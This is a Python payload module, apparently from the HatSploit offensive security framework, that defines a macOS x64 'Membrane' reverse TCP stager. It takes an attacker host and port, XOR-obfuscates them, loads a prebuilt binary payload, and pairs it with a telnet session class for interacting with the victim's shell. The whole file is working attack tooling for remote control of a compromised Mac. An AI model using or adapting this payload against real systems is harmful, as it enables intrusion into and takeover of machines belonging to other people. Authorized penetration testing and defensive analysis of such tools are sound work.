#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.payload import Payload
from hatsploit.utils.string import StringTools
from hatsploit.utils.tcp import TCPClient

from hatsploit.session import Session
from hatsploit.utils.telnet import TelnetClient


class HatSploitSession(Session, TelnetClient):
    client = None

    details = {
        'Platform': "macos",
        'Type': "membrane"
    }

    def open(self, client):
        self.client = self.open_telnet(client)

    def close(self):
        self.client.disconnect()

    def send_command(self, command, output=False, timeout=10):
        output = self.client.send_command(command + '\n', output, timeout)
        if output:
            output = output.replace('membrane > ', '')
        return output

    def interact(self):
        self.client.interact()


class HatSploitPayload(Payload, StringTools, TCPClient):
    details = {
        'Category': "stager",
        'Name': "macOS x64 Membrane Reverse TCP",
        'Payload': "macos/x64/membrane_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Membrane reverse TCP payload for macOS x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "macos",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parse_options(self.options)

        local_host = self.xor_string(local_host)
        local_port = self.xor_string(local_port)

        self.output_process("Generating payload...")
        with open(self.data_path + 'membrane/macos/x64/membrane', 'rb') as f:
            payload = f.read()

        return payload, f"reverse '{local_host}' '{local_port}'", HatSploitSession
